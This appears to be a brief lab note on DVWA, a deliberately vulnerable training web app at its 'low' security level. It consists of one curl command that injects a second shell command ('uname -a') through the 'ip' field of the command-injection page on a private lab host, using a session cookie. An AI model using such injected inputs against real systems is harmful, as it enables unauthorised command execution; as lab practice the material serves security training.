## Target

    https://github.com/ethicalhack3r/DVWA
    
    DVWA Security Level: low

### Command Injection

    curl -s -b 'PHPSESSID=5hq3gpbfl0i22r2trqlommvv20;security=low' -d 'ip=;uname+-a&Submit=Submit' http://192.168.56.101/DVWA/vulnerabilities/exec/index.php | grep Linux
